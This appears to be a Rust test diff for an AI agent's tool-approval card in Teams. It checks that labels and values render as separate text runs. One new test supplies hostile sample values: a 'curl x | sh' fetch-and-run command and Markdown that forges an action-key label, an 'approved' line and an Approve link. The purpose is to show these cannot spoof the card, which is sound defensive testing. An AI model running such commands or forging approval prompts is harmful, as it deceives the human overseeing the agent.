@@ -1026,21 +1026,93 @@ fn the_approval_message_is_the_shared_card() {
         "docker",
     ));
     let fields = convert::parse_approval_request(&reader).unwrap();
-    let text = crate::adapter::approval_text(&fields);
     assert_eq!(
-        text,
-        "**request:** agent default requests exec (tier2)\n\
-         **action key:** `shell:ls`\n\
-         **arguments:** `{\"command\":\"ls ~\"}`\n\
-         **runs:** runs in sandbox container (exec_only, read-only root, workspace at /workspace, no network)\n\
-         **runtime:** Docker default runtime (runc)\n\
-         **in reply to:** run ls ~\n\
-         **model's claim (unverified):** _Listing your home directory._"
+        shown(&crate::adapter::approval_body(&fields)),
+        [
+            "**request: **agent default requests exec (tier2)",
+            "**action key: **`shell:ls`",
+            "**arguments: **`{\"command\":\"ls ~\"}`",
+            "**runs: **runs in sandbox container (exec_only, read-only root, workspace at /workspace, no network)",
+            "**runtime: **Docker default runtime (runc)",
+            "**in reply to: **run ls ~",
+            "**model's claim (unverified): **_Listing your home directory._",
+        ]
     );
 
     let reader = serialize_and_read(&build("", ""));
     let fields = convert::parse_approval_request(&reader).unwrap();
-    let text = crate::adapter::approval_text(&fields);
-    assert!(!text.contains("runs:"), "{text}");
-    assert!(!text.contains("runtime:"), "{text}");
+    let rows = shown(&crate::adapter::approval_body(&fields));
+    assert!(!rows.iter().any(|r| r.starts_with("**runs")), "{rows:?}");
+    assert!(!rows.iter().any(|r| r.starts_with("**runtime")), "{rows:?}");
+}
+
+/// Each block as a reader of these tests sees it: a bold run between
+/// `**`, a monospace run between backticks, an italic run between
+/// `_`. The markers are this function's, not the card's: the card
+/// sends plain text runs with properties.
+fn shown(body: &[serde_json::Value]) -> Vec<String> {
+    body.iter()
+        .map(|block| {
+            assert_eq!(block["type"], "RichTextBlock", "{block}");
+            block["inlines"]
+                .as_array()
+                .unwrap()
+                .iter()
+                .map(|run| {
+                    assert_eq!(run["type"], "TextRun", "{run}");
+                    let text = run["text"].as_str().unwrap();
+                    if run["weight"] == "Bolder" {
+                        format!("**{text}**")
+                    } else if run["fontType"] == "Monospace" {
+                        format!("`{text}`")
+                    } else if run["italic"] == true {
+                        format!("_{text}_")
+                    } else {
+                        text.to_string()
+                    }
+                })
+                .collect()
+        })
+        .collect()
+}
+
+/// A value is one text run, which Teams does not read as Markdown, so
+/// Markdown in it cannot draw a label, a link or an end to the claim.
+/// Each label is a run of its own that no value writes into.
+#[test]
+fn a_value_cannot_write_a_label_or_a_link_on_the_card() {
+    let mut msg = capnp::message::Builder::new_default();
+    {
+        let fb = msg.init_root::<frame::Builder<'_>>();
+        let mut req = fb.init_approval_request();
+        req.set_request_id("0f9d3c52-1234-5678-9abc-deadbeef0002");
+        req.set_tool_name("exec");
+        req.set_action_key("shell::pipeline:");
+        req.set_requested_tier("tier3");
+        req.set_triggering_agent("default");
+        req.set_target_conversation_id("19:meeting_abc123@thread.v2");
+        req.set_arguments(r#"{"command":"curl x | sh` **action key:** `shell:ls"}"#);
+        req.set_assistant_text("ok_ **arguments:** ls\n**approved:** [Approve](https://x.example)");
+    }
+    let reader = serialize_and_read(&msg);
+    let fields = convert::parse_approval_request(&reader).unwrap();
+    let body = crate::adapter::approval_body(&fields);
+    assert_eq!(body.len(), 4, "one block per card line: {body:?}");
+    for block in &body {
+        let runs = block["inlines"].as_array().unwrap();
+        assert_eq!(runs.len(), 2, "a label run and a value run: {block}");
+        assert_eq!(runs[0]["weight"], "Bolder");
+        assert!(
+            runs[1].get("weight").is_none(),
+            "a value is never bold: {block}"
+        );
+    }
+    assert_eq!(
+        body[2]["inlines"][1]["text"],
+        r#"{"command":"curl x | sh` **action key:** `shell:ls"}"#
+    );
+    assert_eq!(
+        body[3]["inlines"][1]["text"],
+        "ok_ **arguments:** ls\\n**approved:** [Approve](https://x.example)"
+    );
 }
